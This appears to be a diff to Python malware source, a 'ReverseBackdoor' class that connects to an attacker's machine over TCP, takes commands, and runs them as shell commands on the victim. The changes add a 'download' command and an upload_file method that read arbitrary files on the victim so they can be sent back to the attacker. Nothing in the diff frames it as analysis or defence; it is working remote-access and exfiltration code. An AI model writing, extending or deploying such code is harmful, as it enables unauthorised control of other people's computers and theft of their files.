@@ -7,6 +7,12 @@ import os
 
 
 class ReverseBackdoor:
+	'''
+	Reverse backdoor class creates a backdoor 
+	by connecting to the attacker's machine 
+	server through TCP socket. 
+	params: ip(str), port(int)
+	'''
 	def __init__(self, ip:str, port:int)->None:
 		self.port = port 
 		self.ip = ip
@@ -67,20 +73,40 @@ class ReverseBackdoor:
 		return '[*] Path changed to ' + path
 
 
+	def upload_file(self, path):
+		'''
+		upload file contents to the attacker server.
+		'''
+		with open(path, 'rb') as file:
+			return file.read()
+
+
 	def run(self):
+		'''
+		start backdoor.
+		'''
 		while True:
 			try:
 				command = self.serial_receive()
 				
 				# remove below line
 				command_lst = command.split(' ')
-				# print(command_lst)
-				if command_lst[0] == 'exit':
+				command_list_len = len(command_lst)==2
+				cmd = command_lst[0]
+				if command_list_len:
+					path = command_lst[1]
+				
+				if cmd == 'exit':
 					self.connection.close()
 					sys.exit()
-				elif command_lst[0] == 'cd' and len(command_lst)==2:
-					cwd_path = command_lst[1]
-					command_output = self.cwd(cwd_path)
+				
+				elif cmd == 'cd' and command_list_len:
+					command_output = self.cwd(path)
+				
+				elif cmd =='download' and command_list_len:
+					file_content = self.upload_file(path)
+					command_output = str(file_content, encoding='utf-8')
+
 				else:
 					command_output = self.execute_command(command)
 
